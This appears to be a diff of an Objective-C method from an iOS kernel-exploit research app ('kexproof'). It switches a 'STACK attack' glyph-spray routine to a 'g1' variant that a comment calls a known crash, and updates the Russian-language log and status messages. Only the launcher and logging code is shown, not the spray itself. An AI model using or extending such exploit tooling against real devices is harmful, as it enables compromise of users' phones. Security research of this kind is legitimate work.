@@ -632,14 +632,15 @@
 
 - (void)runStackAttack {
     if (![self beginJob]) return;
-    self.statusLabel.text = @"STACK attack (W3a)…";
-    [[KPLog shared] append:@"[RESULT] STACK attack — запуск"];
+    self.statusLabel.text = @"STACK attack (g1 tx=32000 DX=31)…";
+    [[KPLog shared] append:@"[RESULT] STACK attack g1 — запуск"];
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        NSString *report = [KPMapScope glyphTypedSprayReport:@"w3a"];
+        // Use g1 variant (tx=32000, DX=31, STACK) — known crash
+        NSString *report = [KPMapScope glyphTypedSprayReport:@"g1"];
         dispatch_async(dispatch_get_main_queue(), ^{
             [[KPLog shared] append:report];
-            self.statusLabel.text = @"STACK attack завершён — см. лог";
-            [self saveExperimentReport:report fileName:@"kexproof-stack-attack.txt"];
+            self.statusLabel.text = @"STACK attack g1 завершён — см. лог";
+            [self saveExperimentReport:report fileName:@"kexproof-stack-g1.txt"];
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
